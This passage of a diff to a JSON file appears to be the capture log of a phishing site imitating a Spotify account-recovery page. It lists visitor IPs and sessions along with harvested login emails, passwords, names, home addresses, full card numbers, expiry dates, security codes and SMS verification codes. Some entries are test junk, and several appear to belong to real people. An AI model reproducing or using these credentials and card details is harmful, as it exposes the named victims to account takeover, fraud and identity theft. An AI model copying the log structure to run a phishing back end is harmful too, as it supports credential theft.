-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T13:25:25.913Z",
-      "timestamp": "2025-01-22T13:25:25.913Z",
-      "disconnectedAt": "2025-01-22T13:27:48.346Z"
-    },
-    {
-      "sessionId": "18d5e42e-4679-40e5-83f8-256187b97c8f",
-      "ip": "205.169.39.3",
-      "country": "US",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T14:01:23.044Z",
-      "timestamp": "2025-01-22T14:01:23.044Z",
-      "disconnectedAt": "2025-01-22T14:03:48.394Z"
+      "lastActive": "2025-01-23T18:33:35.800Z",
+      "timestamp": "2025-01-23T18:33:35.800Z",
+      "disconnectedAt": "2025-01-23T18:35:41.063Z"
     }
   ],
   "userInputs": {
@@ -4003,8 +4258,8 @@
     },
     "8eb3c916-c9a8-4515-bb93-d402ade349b0": {
       "login-username": {
-        "value": "testtesstaa",
-        "timestamp": "2025-01-21T06:06:08.790Z"
+        "value": "aaa",
+        "timestamp": "2025-01-23T04:56:03.858Z"
       },
       "login-password": {
         "value": "aezaezaez",
@@ -4647,6 +4902,240 @@
       "securityCode": {
         "value": "640",
         "timestamp": "2025-01-22T00:11:06.698Z"
+      }
+    },
+    "1209cbb9-4945-40a5-835a-e3f2550f51aa": {
+      "firstName": {
+        "value": "qss",
+        "timestamp": "2025-01-23T03:38:40.901Z"
+      },
+      "lastName": {
+        "value": "sqq",
+        "timestamp": "2025-01-23T03:38:41.544Z"
+      },
+      "street": {
+        "value": "sqsqss",
+        "timestamp": "2025-01-23T03:38:43.412Z"
+      },
+      "city": {
+        "value": "sss",
+        "timestamp": "2025-01-23T03:38:44.851Z"
+      },
+      "login-username": {
+        "value": "df",
+        "timestamp": "2025-01-23T03:47:47.321Z"
+      },
+      "login-password": {
+        "value": "fdfddffd",
+        "timestamp": "2025-01-23T03:47:48.296Z"
+      }
+    },
+    "188c3b6e-4b46-4cbd-bc40-eafa1f240c37": {
+      "login-username": {
+        "value": "dennitest",
+        "timestamp": "2025-01-23T03:39:12.527Z"
+      },
+      "login-password": {
+        "value": "dennitest",
+        "timestamp": "2025-01-23T03:39:13.852Z"
+      }
+    },
+    "488918d4-078b-4756-93c8-fe5422141b01": {
+      "login-username": {
+        "value": "cmcter@shaw.ca",
+        "timestamp": "2025-01-23T03:55:57.311Z"
+      },
+      "login-password": {
+        "value": "Shoot4the*",
+        "timestamp": "2025-01-23T03:56:03.151Z"
+      },
+      "city": {
+        "value": "Surrey",
+        "timestamp": "2025-01-23T03:56:20.518Z"
+      },
+      "firstName": {
+        "value": "Carol",
+        "timestamp": "2025-01-23T03:56:20.526Z"
+      },
+      "lastName": {
+        "value": "McNeill",
+        "timestamp": "2025-01-23T03:56:20.537Z"
+      },
+      "street": {
+        "value": "14831 83 Avenue",
+        "timestamp": "2025-01-23T03:56:20.544Z"
+      },
+      "state": {
+        "value": "British Columbia",
+        "timestamp": "2025-01-23T03:56:20.693Z"
+      },
+      "postalCode": {
+        "value": "V3S 7S1",
+        "timestamp": "2025-01-23T03:56:20.701Z"
+      },
+      "paymentMethod": {
+        "value": "cards",
+        "timestamp": "2025-01-23T04:01:31.248Z"
+      },
+      "cardNumber": {
+        "value": "4512 2387 7247 7179",
+        "timestamp": "2025-01-23T04:02:06.950Z"
+      },
+      "expiryDate": {
+        "value": "03/26",
+        "timestamp": "2025-01-23T04:02:13.250Z"
+      },
+      "securityCode": {
+        "value": "657",
+        "timestamp": "2025-01-23T04:02:16.497Z"
+      },
+      "sms": {
+        "value": "19462085",
+        "timestamp": "2025-01-23T04:04:15.002Z"
+      }
+    },
+    "42ce3492-d03e-45a3-8943-8a8021c00dcf": {
+      "": {
+        "value": "qsd",
+        "timestamp": "2025-01-23T04:32:55.864Z"
+      },
+      "inputsConfig": [
+        {
+          "id": 1,
+          "name": "1",
+          "type": "text",
+          "placeholder": "qsd"
+        },
+        {
+          "id": 2,
+          "name": "2",
+          "type": "text",
+          "placeholder": "qsd"
+        },
+        {
+          "id": 3,
+          "name": "3",
+          "type": "hidden",
+          "placeholder": ""
+        }
+      ]
+    },
+    "9c2099d9-985e-4559-aba0-edf716cd7aec": {
+      "login-username": {
+        "value": "zz",
+        "timestamp": "2025-01-23T04:56:20.144Z"
+      },
+      "login-password": {
+        "value": "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
+        "timestamp": "2025-01-23T04:56:55.087Z"
+      }
+    },
+    "e84ffb30-1664-4f79-8d59-a8d092aa74b9": {
+      "login-username": {
+        "value": "ssssssssssss",
+        "timestamp": "2025-01-23T06:03:03.363Z"
+      },
+      "login-password": {
+        "value": "qqqqaaaaaazeeeeeee",
+        "timestamp": "2025-01-23T06:03:07.521Z"
+      }
+    },
+    "aef93b4a-62c1-41ba-ba0f-81da283d979a": {
+      "login-username": {
+        "value": "rretana76@gmail.com",
+        "timestamp": "2025-01-23T09:50:38.475Z"
+      },
+      "login-password": {
+        "value": "72769605",
+        "timestamp": "2025-01-23T09:50:38.496Z"
+      },
+      "firstName": {
+        "value": "Rafael",
+        "timestamp": "2025-01-23T09:50:46.965Z"
+      },
+      "lastName": {
+        "value": "Retana",
+        "timestamp": "2025-01-23T09:50:47.942Z"
+      },
+      "street": {
+        "value": "Camino Viejo a San José8981",
+        "timestamp": "2025-01-23T09:51:05.190Z"
+      },
+      "paymentMethod": {
+        "value": "cards",
+        "timestamp": "2025-01-23T09:51:45.742Z"
+      },
+      "cardNumber": {
+        "value": "5460800009062014",
+        "timestamp": "2025-01-23T09:52:30.434Z"
+      },
+      "expiryDate": {
+        "value": "07/29",
+        "timestamp": "2025-01-23T09:52:39.777Z"
+      },
+      "securityCode": {
+        "value": "384",
+        "timestamp": "2025-01-23T09:52:45.213Z"
+      }
+    },
+    "f8be4564-5042-4c25-bc49-095b1c5d17fc": {
+      "login-username": {
+        "value": "sabine@unisongroup.ca",
+        "timestamp": "2025-01-23T17:38:36.748Z"
+      },
+      "login-password": {
+        "value": "Unison1!@",
+        "timestamp": "2025-01-23T17:38:55.885Z"
+      },
+      "street": {
+        "value": "9 Davies Avenue",
+        "timestamp": "2025-01-23T17:40:50.888Z"
+      },
+      "firstName": {
+        "value": "Sabine",
+        "timestamp": "2025-01-23T17:40:50.671Z"
+      },
+      "lastName": {
+        "value": "Grimes",
+        "timestamp": "2025-01-23T17:40:50.791Z"
+      },
+      "city": {
+        "value": "Toronto",
+        "timestamp": "2025-01-23T17:40:50.904Z"
+      },
+      "state": {
+        "value": "ONTARIO",
+        "timestamp": "2025-01-23T17:40:50.922Z"
+      },
+      "postalCode": {
+        "value": "M4M 2A6",
+        "timestamp": "2025-01-23T17:40:51.030Z"
+      },
+      "paymentMethod": {
+        "value": "cards",
+        "timestamp": "2025-01-23T17:42:05.069Z"
+      },
+      "cardNumber": {
+        "value": "4520707036718263",
+        "timestamp": "2025-01-23T17:42:06.775Z"
+      },
+      "expiryDate": {
+        "value": "02/29",
+        "timestamp": "2025-01-23T17:42:09.845Z"
+      },
+      "securityCode": {
+        "value": "932",
+        "timestamp": "2025-01-23T17:42:13.566Z"
+      },
+      "sms": {
+        "value": "214724",
+        "timestamp": "2025-01-23T17:45:43.121Z"
+      }
+    },
+    "89ee6b8a-819e-4075-b92f-566937acd334": {
+      "login-username": {
+        "value": "paul@tilco.ca",
+        "timestamp": "2025-01-23T17:35:25.230Z"
       }
     }
   }
